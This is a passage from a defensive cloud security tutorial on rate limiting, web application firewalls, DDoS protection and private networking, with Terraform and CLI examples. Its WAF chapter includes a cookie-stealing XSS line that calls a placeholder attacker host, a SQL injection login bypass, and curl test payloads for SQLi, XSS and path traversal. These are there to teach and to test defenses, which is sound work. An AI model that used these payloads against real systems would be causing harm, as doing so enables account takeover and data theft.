Access tokens should expire in minutes to hours, not days or months. A stolen long-lived token gives an attacker prolonged access. Use refresh tokens (which have longer lives but can only be used to get new short-lived access tokens).

**Mistake 3: Not validating the `aud` claim in JWTs**

A JWT issued for Service A should not be accepted by Service B. Always validate that the `aud` (audience) claim in the JWT matches your API's expected audience. Skipping this allows token substitution attacks.

**Mistake 4: Treating rate limits as the only anti-abuse measure**

Rate limiting prevents volume-based attacks but doesn't stop an attacker with many IPs. Layer it with authentication, anomaly detection, and behavioral analysis.

**Mistake 5: API keys in client-side code**

Any API key embedded in JavaScript that runs in the browser is public. Use OAuth2 flows for browser clients. API keys are for server-to-server communication only.

### How This Works in the Real World

Every major SaaS API uses OAuth2/OIDC. Stripe, GitHub, Google Cloud, and AWS all issue short-lived tokens and provide detailed guidance on token management.

A typical enterprise API platform handles:
- **Thousands of third-party integrations** each with their own scoped API keys
- **Developer portal** where external developers register applications and get OAuth2 credentials
- **Usage dashboards** showing which keys are approaching rate limits
- **Automated key rotation** in CI/CD pipelines using secret managers (AWS Secrets Manager, HashiCorp Vault)

### Practical Task — Chapter 3

**Task:** Implement rate limiting: 100 req/min per IP at API Gateway, 1000 req/min global at CloudFront.

**Part 1: Rate limiting at AWS API Gateway**

```bash
# Create a usage plan with per-IP throttling
# Note: API Gateway throttling is per API key, not per IP natively
# For IP-based throttling, combine with WAF (see Part 2)

aws apigateway create-usage-plan \
  --name "rate-limited-plan" \
  --throttle burstLimit=20,rateLimit=1.67  
  # rateLimit is requests/second: 100/min = 1.67/sec
```

For true per-IP rate limiting at API Gateway, use WAF:

```json
{
  "Name": "PerIPRateLimit",
  "Priority": 0,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 100,
      "AggregateKeyType": "IP",
      "EvaluationWindowSec": 60
    }
  },
  "Action": {
    "Block": {
      "CustomResponse": {
        "ResponseCode": 429,
        "CustomResponseBodyKey": "rate-limit-response",
        "ResponseHeaders": [
          {
            "Name": "Retry-After",
            "Value": "60"
          }
        ]
      }
    }
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "PerIPRateLimitRule"
  }
}
```

**Part 2: Global rate limiting at CloudFront**

```hcl
# Terraform: Create WAF ACL for CloudFront with global rate limit
resource "aws_wafv2_web_acl" "cloudfront_acl" {
  name  = "cloudfront-rate-limit"
  scope = "CLOUDFRONT"   # Must be CLOUDFRONT for CloudFront (not REGIONAL)
  
  # Default action: allow requests that don't match any rule
  default_action {
    allow {}
  }

  rule {
    name     = "GlobalRateLimit"
    priority = 1

    statement {
      rate_based_statement {
        limit              = 1000         # Max 1000 requests per evaluation window
        aggregate_key_type = "IP"         # Count per source IP
        evaluation_window_sec = 60        # Per 60-second window
      }
    }

    action {
      block {
        custom_response {
          response_code = 429   # HTTP 429 Too Many Requests
        }
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "GlobalRateLimit"
      sampled_requests_enabled   = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "CloudFrontRateLimitACL"
    sampled_requests_enabled   = true
  }
}

# Attach the WAF to your CloudFront distribution
resource "aws_cloudfront_distribution" "main" {
  # ... other config ...
  
  web_acl_id = aws_wafv2_web_acl.cloudfront_acl.arn
}
```

**Part 3: Test the rate limits**

```bash
# Test IP rate limiting (should get 429 after 100 requests in 60 seconds)
for i in $(seq 1 150); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://api.myapp.com/endpoint)
  echo "Request $i: $STATUS"
  if [ "$STATUS" = "429" ]; then
    echo "Rate limit hit at request $i"
    break
  fi
done

# Monitor CloudWatch metrics for rate limit blocks
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name BlockedRequests \
  --dimensions Name=WebACL,Value=cloudfront-rate-limit Name=Region,Value=us-east-1 Name=Rule,Value=GlobalRateLimit \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 60 \
  --statistics Sum
```

### Chapter 3 Summary

- An **API gateway** is the single entry point for all API traffic — enforcing auth, rate limits, and routing
- **Rate limiting** protects against abuse and DoS at both per-IP and global levels
- **OAuth2/OIDC** provides secure, delegated authentication using short-lived access tokens
- **JWTs** carry claims about the user's identity and must be validated for signature, expiry, and audience
- **API keys** are for machine-to-machine auth — never in client-side code, always rotated, always scoped
- **WAF** at the gateway layer blocks common attack patterns before they reach your services
- Combine rate limiting, authentication, and WAF for defense-in-depth at the API layer

---

## Chapter 4 — Cloud WAF {#chapter-4}

### What is a Web Application Firewall?

Imagine your application is a bank vault. The vault has a door with a combination lock — that's your authentication. But what if an attacker doesn't try to open the lock? What if they try to slip a forged document through the mail slot, or pour acid through the ventilation system?

A **Web Application Firewall (WAF)** inspects every request for known attack patterns and blocks malicious ones before they ever reach your application code. It's a specialist guard who knows exactly how burglars behave.

Unlike network firewalls (which operate at Layers 3-4: IP addresses and ports), WAFs operate at **Layer 7** (HTTP/HTTPS). They can read the content of requests — URLs, headers, body, cookies — and make decisions based on that content.

### The OWASP Top 10: What WAFs Protect Against

The **Open Web Application Security Project (OWASP)** publishes a list of the most critical web application security risks. These are what attackers actually use to compromise applications:

**1. Injection (SQL Injection, Command Injection)**

Attacker inserts malicious code into input fields:
```sql
-- Legitimate query
SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2'

-- SQL injection: attacker enters username as: admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
-- The -- comments out the password check. Attacker logs in as admin.
```

**2. Broken Authentication**

Weak session management, predictable tokens, missing MFA.

**3. Sensitive Data Exposure**

Credit card numbers, SSNs, passwords in logs or responses.

**4. XML External Entities (XXE)**

Malicious XML that reads files from your server.

**5. Broken Access Control**

Users accessing resources they shouldn't. For example: changing `?user_id=123` to `?user_id=124` to see another user's data.

**6. Security Misconfiguration**

Default credentials, exposed admin interfaces, verbose error messages.

**7. Cross-Site Scripting (XSS)**

Injecting JavaScript into pages viewed by other users:
```html
<!-- Attacker stores this as their username -->
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
<!-- When another user's browser renders this, their cookie is stolen -->
```

**8. Insecure Deserialization**

Manipulating serialized objects to execute code.

**9. Using Components with Known Vulnerabilities**

Outdated libraries with published CVEs.

**10. Insufficient Logging & Monitoring**

Not knowing you were attacked until long after the fact.

### AWS WAF: Architecture and Configuration

AWS WAF sits in front of your ALB (Application Load Balancer), CloudFront distribution, API Gateway, or AppSync. Every request passes through WAF before reaching your service.

```
Internet → CloudFront/ALB → AWS WAF → Your Application
                         ↓
                  Blocked requests
                  (returned as 403)
```

**AWS WAF Core Concepts:**

- **Web ACL (Access Control List):** A collection of rules applied to your resource
- **Rule Group:** A reusable set of rules (AWS provides managed rule groups; you can create custom ones)
- **Rules:** Individual conditions + actions (Allow, Block, Count, CAPTCHA)
- **Capacity Units (WCU):** Every rule costs WCUs. Web ACLs have a limit (default: 1500 WCU)

**Setting up AWS WAF with managed rule groups:**

```hcl
# Terraform configuration for AWS WAF
resource "aws_wafv2_web_acl" "main" {
  name  = "production-waf"
  scope = "REGIONAL"    # Use REGIONAL for ALB/API GW; CLOUDFRONT for CloudFront

  default_action {
    allow {}    # Allow by default; rules will block bad traffic
  }

  # Rule 1: AWS Managed Core Rule Set
  # Covers OWASP Top 10 and other common web exploits
  # This is AWS's continuously-updated ruleset maintained by their security team
  rule {
    name     = "AWSManagedRulesCommonRuleSet"
    priority = 1    # Lower number = evaluated first

    override_action {
      none {}    # Use the rule group's own actions (block/allow/count)
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesCommonRuleSet"
        vendor_name = "AWS"
        # Optional: override specific rules within the group
        rule_action_override {
          action_to_use {
            count {}    # Change this specific rule from Block to Count (for testing)
          }
          name = "SizeRestrictions_BODY"   # This rule blocks large bodies
        }
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "CommonRuleSet"
      sampled_requests_enabled   = true
    }
  }

  # Rule 2: SQL Injection protection
  rule {
    name     = "AWSManagedRulesSQLiRuleSet"
    priority = 2

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesSQLiRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "SQLiRuleSet"
      sampled_requests_enabled   = true
    }
  }

  # Rule 3: Known Bad Inputs
  # Blocks requests that match patterns known to exploit vulnerabilities
  rule {
    name     = "AWSManagedRulesKnownBadInputsRuleSet"
    priority = 3

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "KnownBadInputs"
      sampled_requests_enabled   = true
    }
  }

  # Rule 4: IP Reputation List
  # Blocks IP addresses known to be associated with malicious activity
  rule {
    name     = "AWSManagedRulesAmazonIpReputationList"
    priority = 4

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesAmazonIpReputationList"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "IPReputationList"
      sampled_requests_enabled   = true
    }
  }

  # Rule 5: Custom rule to block specific countries (if required by compliance)
  rule {
    name     = "GeoBlockRule"
    priority = 5

    action {
      block {}
    }

    statement {
      geo_match_statement {
        country_codes = ["KP", "IR", "CU"]   # North Korea, Iran, Cuba
        # Check OFAC sanctions list for countries requiring blocking
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "GeoBlock"
      sampled_requests_enabled   = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "ProductionWAF"
    sampled_requests_enabled   = true
  }
}

# Associate WAF with your ALB
resource "aws_wafv2_web_acl_association" "main" {
  resource_arn = aws_lb.main.arn
  web_acl_arn  = aws_wafv2_web_acl.main.arn
}
```

### Azure Application Gateway WAF

Azure's equivalent is the **Application Gateway with WAF_v2 SKU**, which integrates the **OWASP Core Rule Set (CRS)** and Microsoft's own managed rule sets.

```json
{
  "name": "production-waf-policy",
  "type": "Microsoft.Network/applicationGatewayWebApplicationFirewallPolicies",
  "properties": {
    "policySettings": {
      "state": "Enabled",
      "mode": "Prevention",
      "requestBodyCheck": true,
      "maxRequestBodySizeInKb": 128,
      "fileUploadLimitInMb": 100
    },
    "managedRules": {
      "managedRuleSets": [
        {
          "ruleSetType": "OWASP",
          "ruleSetVersion": "3.2",
          "ruleGroupOverrides": [
            {
              "ruleGroupName": "REQUEST-942-APPLICATION-ATTACK-SQLI",
              "rules": [
                {
                  "ruleId": "942100",
                  "state": "Enabled",
                  "action": "Block"
                }
              ]
            }
          ]
        },
        {
          "ruleSetType": "Microsoft_BotManagerRuleSet",
          "ruleSetVersion": "1.0"
        }
      ]
    }
  }
}
```

### Google Cloud Armor

Google's Cloud Armor provides WAF for GCP Load Balancers. It uses the same OWASP rule set concepts but with GCP-native configuration:

```bash
# Create a Cloud Armor security policy
gcloud compute security-policies create production-security-policy \
  --description "Production WAF policy"

# Add OWASP Top 10 pre-configured rules
gcloud compute security-policies rules create 1000 \
  --security-policy production-security-policy \
  --expression "evaluatePreconfiguredExpr('xss-stable')" \
  --action deny-403 \
  --description "Block XSS attacks"

gcloud compute security-policies rules create 1001 \
  --security-policy production-security-policy \
  --expression "evaluatePreconfiguredExpr('sqli-stable')" \
  --action deny-403 \
  --description "Block SQL injection"

gcloud compute security-policies rules create 1002 \
  --security-policy production-security-policy \
  --expression "evaluatePreconfiguredExpr('lfi-stable')" \
  --action deny-403 \
  --description "Block local file inclusion"

# Attach to backend service (your load balancer backend)
gcloud compute backend-services update my-backend-service \
  --security-policy production-security-policy \
  --global
```

### WAF Tuning: Avoiding False Positives

A freshly configured WAF with strict rules will block legitimate traffic. This is called a **false positive** — blocking something that should be allowed.

**The WAF tuning process:**

**Phase 1: Count mode (learning phase)**
Set all rules to "Count" instead of "Block". This logs what would have been blocked without actually blocking it. Run this for 1-2 weeks.

```bash
# AWS: Check what would have been blocked
aws wafv2 get-sampled-requests \
  --web-acl-arn <your-web-acl-arn> \
  --rule-metric-name CommonRuleSet \
  --scope REGIONAL \
  --time-window StartTime=$(date -d '1 hour ago' +%s),EndTime=$(date +%s) \
  --max-items 100
```

**Phase 2: Review and tune**
For each rule that's generating false positives, either:
- Create an exception for that specific endpoint
- Exclude that rule from the rule group
- Adjust the match conditions

**Phase 3: Switch to Prevention mode**
Once false positives are resolved, switch from Count to Block.

### Common Mistakes Beginners Make

**Mistake 1: Enabling WAF in Prevention mode on day one**

Always start in Detection/Count mode. Going straight to Prevention will break legitimate traffic and create an incident.

**Mistake 2: Not reviewing WAF logs**

A WAF that's blocking traffic but whose logs nobody reads is not providing security value. Set up CloudWatch dashboards and alerts for blocked requests.

**Mistake 3: Relying solely on managed rule groups**

Managed rule groups cover generic attacks. Custom rules are needed for your specific application's patterns — blocking known bad user agents, rate limiting specific endpoints, blocking IPs that have shown malicious behavior.

**Mistake 4: Treating WAF as the only layer**

WAF blocks known bad patterns but doesn't catch everything. It's one layer of many (principle of defense-in-depth).

### How This Works in the Real World

Large e-commerce sites like Amazon themselves, retail banks, and news media companies handle massive volumes of malicious traffic through WAF:

- A major retailer reported blocking 99.8% of SQL injection attempts via their WAF before they reached application code
- Banks use WAF geo-blocking combined with IP reputation lists to reduce fraudulent login attempts
- Healthcare portals use WAF to comply with HIPAA requirements around protecting PHI (Protected Health Information) from injection attacks

### Practical Task — Chapter 4

**Task:** Set up AWS WAF with managed rule groups in front of your ALB — test with OWASP Top 10 payloads.

**Step 1: Deploy the WAF (using the Terraform above)**

```bash
terraform init
terraform plan
terraform apply
```

**Step 2: Start in Count mode and test**

Before switching to block mode, verify your WAF detects attacks:

```bash
# Test SQL injection detection
curl -X POST "https://your-alb-domain.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR 1=1 --", "password": "test"}'
# Expected in WAF logs: CountedRequests metric increments for SQLiRuleSet

# Test XSS detection
curl "https://your-alb-domain.com/api/search?q=<script>alert(1)</script>"
# Expected in WAF logs: CountedRequests metric increments for CommonRuleSet

# Test path traversal
curl "https://your-alb-domain.com/api/files?path=../../etc/passwd"
# Expected: Blocked by KnownBadInputsRuleSet

# Test oversized body (> 8KB limit)
python3 -c "print('A' * 10000)" | curl -X POST "https://your-alb-domain.com/api/data" \
  -H "Content-Type: text/plain" --data-binary @-
```

**Step 3: Review CloudWatch metrics**

```bash
# Check blocked vs allowed requests over last hour
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name BlockedRequests \
  --dimensions \
    Name=WebACL,Value=production-waf \
    Name=Region,Value=us-east-1 \
    Name=Rule,Value=ALL \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 300 \
  --statistics Sum
```

**Step 4: Switch to Prevention mode**

Once you've reviewed the Count logs and confirmed there are no false positives:

```hcl
# Update the override_action in each rule from count to none
# This enables the rule group's default actions (which are Block)
override_action {
  none {}   # Was: count {}
}
```

```bash
terraform apply
# Verify prevention mode is active by repeating the test requests
# They should now return 403 Forbidden
```

### Chapter 4 Summary

- A **WAF** inspects HTTP requests at Layer 7, blocking known attack patterns before they reach your app
- **OWASP Top 10** describes the most common web vulnerabilities; WAF rules target these patterns
- **Managed rule groups** (AWS, Azure, GCP) provide continuously-updated protection without manual rule writing
- **Always start in Count/Detection mode** before switching to Prevention/Block mode
- **WAF tuning** is an ongoing process — legitimate traffic patterns change over time
- **AWS WAF** attaches to ALB, CloudFront, API Gateway, or AppSync
- Combine WAF with rate limiting, IP reputation lists, and geographic blocking for layered defense

---

## Chapter 5 — DDoS Protection {#chapter-5}

### What is a DDoS Attack?

Imagine you run a small restaurant with 10 tables. On a normal Saturday, 40 people come to eat — manageable, profitable, everyone happy. Now imagine a competitor hires 1,000 people to sit in your restaurant all day, not ordering anything. No real customer can get a table. That's a **Distributed Denial of Service** attack.

In the digital world, an attacker uses thousands of computers (often hijacked devices — a "botnet") to flood your service with traffic. The goal is simple: overwhelm your resources so legitimate users can't reach you.

**Types of DDoS attacks:**

**Volumetric attacks:** Saturate your bandwidth with sheer volume. Send 100 Gbps of UDP packets to a target that has a 10 Gbps connection. The pipe is full; legitimate traffic can't get through.

**Protocol attacks:** Exploit weaknesses in network protocols. SYN flood: send millions of TCP SYN packets (connection requests) but never complete the handshake. The server's connection table fills up.

**Application-layer attacks (Layer 7):** Mimic legitimate traffic. Send thousands of HTTP requests that are valid but computationally expensive — like complex database queries. Harder to detect because each individual request looks legitimate.

### AWS Shield: Built-in DDoS Protection

AWS Shield comes in two tiers:

**AWS Shield Standard (Free, always on):**
- Automatically enabled for all AWS customers
- Protects against most common volumetric and protocol attacks
- Integrates with CloudFront, ALB, Route 53, and Global Accelerator
- Provides no SLA or access to the DDoS Response Team (DRT)

**AWS Shield Advanced ($3,000/month + data transfer fees):**
- 24/7 access to the AWS DRT for incident support
- Detailed attack diagnostics and post-attack reports
- Protection against more sophisticated attacks
- Cost protection (AWS will credit you if scaling costs spike due to a DDoS attack)
- Works with WAF for Layer 7 protection

```bash
# Enable Shield Advanced on your resources
aws shield create-protection \
  --name "my-alb-protection" \
  --resource-arn "arn:aws:elasticloadbalancing:us-east-1:123456789:loadbalancer/app/my-alb/abc123"

# Check protection status
aws shield describe-protections

# View active attacks
aws shield list-attacks \
  --start-time StartTime=$(date -d '7 days ago' +%s),EndTime=$(date +%s)
```

### Azure DDoS Protection

Azure provides two tiers:

**DDoS Network Protection (Basic):** Always-on, no additional cost. Protects Azure infrastructure.

**DDoS Network Protection (Standard):** Per-virtual-network pricing. Provides adaptive tuning, attack mitigation reports, and access to Azure's DDoS rapid response team.

```json
{
  "type": "Microsoft.Network/virtualNetworks",
  "name": "production-vnet",
  "properties": {
    "enableDdosProtection": true,
    "ddosProtectionPlan": {
      "id": "/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Network/ddosProtectionPlans/my-ddos-plan"
    }
  }
}
```

### Cloudflare DDoS Protection

Cloudflare acts as a reverse proxy — all traffic to your domain goes through Cloudflare's network first. Their network absorbs attack traffic:

```
Attacker's botnet → Cloudflare's global network (1+ Tbps capacity)
                                    ↓ (only clean traffic)
                          Your origin server
```

**Key Cloudflare DDoS features:**

- **Anycast network:** Traffic is absorbed at the nearest Cloudflare data center, not sent to your origin
- **L3/L4 DDoS protection:** Automatic, included in all plans
- **L7 DDoS protection:** Managed rules + rate limiting
- **Under Attack Mode:** Enables maximum protection that requires JavaScript challenge for all visitors

```bash
# Enable Under Attack Mode via Cloudflare API (use during active attack)
curl -X PATCH "https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/security_level" \
  -H "Authorization: Bearer {api_token}" \
  -H "Content-Type: application/json" \
  --data '{"value":"under_attack"}'

# After attack subsides, return to normal
curl -X PATCH "https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/security_level" \
  -H "Authorization: Bearer {api_token}" \
  -H "Content-Type: application/json" \
  --data '{"value":"medium"}'
```

### Designing for DDoS Resilience

Protection products help, but architectural decisions matter more. The most DDoS-resilient architectures have:

**1. CDN as first line of defense**

Put all static content behind CloudFront or Cloudflare. CDN capacity dwarfs most origins; serving static content from a CDN means your origin server only needs to handle dynamic requests.

**2. Autoscaling**

Configure your application to scale horizontally under load. While AWS Shield absorbs the attack, your application can scale to handle any traffic that gets through.

```yaml
# Kubernetes HPA: scale up when CPU > 70%
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: api-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: api
  minReplicas: 3
  maxReplicas: 50
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
```

**3. Connection limits and timeouts**

Configure your load balancer to reject connections early under overload:

```
ALB settings:
  Idle timeout: 60s (not the default 4000s)
  Max connections: appropriate for your backend capacity

NGINX configuration example:
  limit_conn_zone $binary_remote_addr zone=addr:10m;
  limit_conn addr 100;    # Max 100 concurrent connections per IP
  limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
  limit_req zone=one burst=20;   # Allow burst of 20, then 10 req/sec
```

**4. Origin IP obfuscation**

If your origin server's IP address is known, attackers can bypass Cloudflare/CDN and attack your origin directly. Keep your origin IP private.

```bash
# Never expose your EC2/server IP in DNS records
# Use your CDN's addresses as the DNS target, not your origin IP

# Check if your origin IP is exposed
curl https://api.hackertarget.com/hostsearch/?q=yourdomain.com
# If this shows your origin IP, you need to rotate it
```

### Common Mistakes Beginners Make

**Mistake 1: Relying only on cloud provider DDoS protection for Layer 7**

AWS Shield protects against volumetric attacks but isn't designed to stop slow HTTP floods or credential stuffing at Layer 7. You need WAF rules and rate limiting for those.

**Mistake 2: Not testing your response plan**

Many teams have DDoS protection but have never tested it. Use tools like `hping3` or Cloudflare's built-in DDoS simulation to test your defenses in a controlled environment (with your provider's permission).

**Mistake 3: Single region with no failover**

If an attack exhausts resources in us-east-1, you want to be able to shift traffic to us-west-2. Multi-region with Route 53 health checks enables failover.

**Mistake 4: Forgetting about your DNS provider**

Your app can have perfect DDoS protection, but if your DNS provider goes down under a DDoS attack, your domain doesn't resolve. Use a DDoS-protected DNS provider (Route 53, Cloudflare).

### How This Works in the Real World

In 2020, AWS reported mitigating the largest DDoS attack ever recorded at that time: 2.3 Tbps. In 2022, Cloudflare mitigated a 26 million requests-per-second HTTP DDoS attack. These attacks are growing in size every year.

Real-world DDoS response at a company like a large game publisher:
1. CDN absorbs initial spike
2. Shield/Cloudflare traffic scrubbing engages
3. On-call engineer reviews attack traffic characteristics in CloudWatch
4. Custom WAF rules deployed to block the specific attack signature
5. Post-attack: report generated, defenses adjusted

### Practical Task — Chapter 5

**Task:** Understand how AWS Shield integrates with your existing infrastructure and simulate a protection scenario.

```bash
# Step 1: Enable Shield Advanced on your key resources
aws shield create-protection \
  --name "Production-ALB" \
  --resource-arn "arn:aws:elasticloadbalancing:REGION:ACCOUNT:loadbalancer/app/ALBNAME/ID"

aws shield create-protection \
  --name "Production-CloudFront" \
  --resource-arn "arn:aws:cloudfront::ACCOUNT:distribution/DISTID"

aws shield create-protection \
  --name "Production-Route53" \
  --resource-arn "arn:aws:route53:::hostedzone/HOSTEDZONEID"

# Step 2: Create a Protection Group (groups resources for consolidated monitoring)
aws shield create-protection-group \
  --protection-group-id "production-group" \
  --aggregation SUM \
  --pattern ALL

# Step 3: Set up CloudWatch alarm for DDoS detection
aws cloudwatch put-metric-alarm \
  --alarm-name "DDoSDetected" \
  --alarm-description "Alert when DDoS attack is detected on any protected resource" \
  --metric-name DDoSDetected \
  --namespace AWS/DDoSProtection \
  --statistic Sum \
  --period 60 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:REGION:ACCOUNT:security-alerts

# Step 4: Verify protections are active
aws shield list-protections --query 'Protections[*].[Name,ProtectionArn]' --output table

# Step 5: Review Shield health status
aws shield describe-emergency-contact-settings
```

### Chapter 5 Summary

- **DDoS attacks** overwhelm resources using distributed attack traffic — volumetric, protocol, or application-layer
- **AWS Shield Standard** is free and automatically protects against most common attacks
- **AWS Shield Advanced** adds sophisticated protection, DRT support, and attack diagnostics
- **Azure DDoS Protection Standard** provides similar capabilities on Azure
- **Cloudflare** as a reverse proxy absorbs attack traffic at the CDN level
- **Architecture matters:** CDN, autoscaling, connection limits, and origin IP hiding reduce attack surface
- Always protect DNS — an unprotected DNS provider is an Achilles' heel

---

## Chapter 6 — Private Networking {#chapter-6}

### Why "Private" Matters

The public internet is a shared, untrusted network. Any data traveling over it passes through equipment owned by ISPs, cloud providers, and — potentially — adversaries. While encryption (TLS) protects the content of your traffic, the fact of the traffic (metadata: who's talking to whom, when, how much) is still visible.

For sensitive internal traffic — your application talking to your database, your microservices calling each other, your developers accessing production systems — you want communication that never touches the public internet. That's what private networking provides.

### VPNs: Encrypted Tunnels Over the Public Internet

A **VPN (Virtual Private Network)** creates an encrypted tunnel between two endpoints over the public internet. It's like mailing a letter in a tamper-evident envelope: the envelope travels through the regular postal system, but nobody can read the contents.

**Site-to-Site VPN:** Connects two networks (e.g., your on-premises data center to your AWS VPC).

```
On-Premises Network                          AWS VPC
[192.168.0.0/16]  ←── encrypted tunnel ───►  [10.0.0.0/16]
[VPN Gateway]                                 [Virtual Private Gateway]
```

**AWS Site-to-Site VPN setup:**

```bash
# Step 1: Create a Customer Gateway (represents your on-premises VPN device)
aws ec2 create-customer-gateway \
  --type ipsec.1 \
  --public-ip YOUR_ONPREM_VPN_IP \
  --bgp-asn 65000   # Your BGP Autonomous System Number

# Step 2: Create a Virtual Private Gateway (the AWS side of the tunnel)
VGW_ID=$(aws ec2 create-vpn-gateway \
  --type ipsec.1 \
  --query 'VpnGateway.VpnGatewayId' --output text)

# Step 3: Attach the VGW to your VPC
aws ec2 attach-vpn-gateway \
  --vpn-gateway-id $VGW_ID \
  --vpc-id YOUR_VPC_ID

# Step 4: Create the VPN connection
aws ec2 create-vpn-connection \
  --type ipsec.1 \
  --customer-gateway-id CGW_ID \
  --vpn-gateway-id $VGW_ID \
  --options '{"StaticRoutesOnly": false}'   # false = use BGP for routing

# Step 5: Download and apply the configuration to your on-premises VPN device
aws ec2 describe-vpn-connections --query 'VpnConnections[*].CustomerGatewayConfiguration'
```

### AWS PrivateLink: Accessing AWS Services Without the Internet

**AWS PrivateLink** lets you access AWS services and services hosted by other AWS customers over private IP addresses within your VPC. Traffic never leaves the AWS network.

**Without PrivateLink:**
```
Your EC2 → Internet Gateway → AWS S3 public endpoint
```
Traffic goes over the public internet (even within AWS).

**With PrivateLink (VPC Endpoint):**
```
Your EC2 → VPC Endpoint → AWS S3 private endpoint
```
Traffic stays entirely within AWS's private network.

```hcl
# Terraform: Create VPC Endpoints for common AWS services
# Removing all public internet paths for service access

# S3 Gateway Endpoint (free, doesn't use private IPs)
resource "aws_vpc_endpoint" "s3" {
  vpc_id       = aws_vpc.main.id
  service_name = "com.amazonaws.us-east-1.s3"
  # Gateway type: only works for S3 and DynamoDB; uses route tables
  vpc_endpoint_type = "Gateway"
  route_table_ids   = [aws_route_table.private.id]
}

# DynamoDB Gateway Endpoint
resource "aws_vpc_endpoint" "dynamodb" {
  vpc_id            = aws_vpc.main.id
  service_name      = "com.amazonaws.us-east-1.dynamodb"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = [aws_route_table.private.id]
}

# Interface Endpoints (use private IPs in your VPC)
# Required for most other AWS services

# Secrets Manager — so EC2 instances can fetch secrets privately
resource "aws_vpc_endpoint" "secretsmanager" {
  vpc_id              = aws_vpc.main.id
  service_name        = "com.amazonaws.us-east-1.secretsmanager"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = aws_subnet.private[*].id
  security_group_ids  = [aws_security_group.vpc_endpoint.id]
  private_dns_enabled = true   # DNS resolves to private IP automatically
}

# ECR — for pulling container images privately
resource "aws_vpc_endpoint" "ecr_api" {
  vpc_id              = aws_vpc.main.id
  service_name        = "com.amazonaws.us-east-1.ecr.api"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = aws_subnet.private[*].id
  security_group_ids  = [aws_security_group.vpc_endpoint.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "ecr_dkr" {
  vpc_id              = aws_vpc.main.id
  service_name        = "com.amazonaws.us-east-1.ecr.dkr"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = aws_subnet.private[*].id
  security_group_ids  = [aws_security_group.vpc_endpoint.id]
  private_dns_enabled = true
}

# CloudWatch Logs — so logs from private instances reach CloudWatch
resource "aws_vpc_endpoint" "logs" {
  vpc_id              = aws_vpc.main.id
  service_name        = "com.amazonaws.us-east-1.logs"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = aws_subnet.private[*].id
  security_group_ids  = [aws_security_group.vpc_endpoint.id]
  private_dns_enabled = true
}

# Security group for VPC endpoints
resource "aws_security_group" "vpc_endpoint" {
  name   = "vpc-endpoint-sg"
  vpc_id = aws_vpc.main.id

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = [aws_vpc.main.cidr_block]   # Only your VPC can use these endpoints
  }
}
```

### Private DNS: Keeping Resolution Internal

**Private DNS** allows your internal services to be reachable by name within your VPC without exposing those names (or the services) to the public internet.

```hcl
# Route 53 Private Hosted Zone
resource "aws_route53_zone" "private" {
  name = "internal.mycompany.com"

  vpc {
    vpc_id = aws_vpc.main.id   # Only resolvable within this VPC
  }
}

# Create internal DNS records
resource "aws_route53_record" "database" {
  zone_id = aws_route53_zone.private.zone_id
  name    = "database.internal.mycompany.com"
  type    = "CNAME"
  ttl     = 300
  records = [aws_db_instance.main.address]
  # This resolves to a private RDS IP, not accessible from the internet
}

resource "aws_route53_record" "cache" {
  zone_id = aws_route53_zone.private.zone_id
  name    = "cache.internal.mycompany.com"
  type    = "CNAME"
  ttl     = 300
  records = [aws_elasticache_cluster.main.cache_nodes[0].address]
}
```

With this setup, your application connects to `database.internal.mycompany.com`. This name resolves only within your VPC, to a private IP, and the traffic never touches the internet.

### Removing the NAT Gateway: True Private Architecture

For applications where all AWS services are accessed via VPC endpoints, you can remove the NAT gateway entirely. This means instances in private subnets have zero outbound internet access — not just for inbound.

```hcl
# True private subnet: no route to internet
resource "aws_route_table" "truly_private" {
  vpc_id = aws_vpc.main.id

  # Only routes:
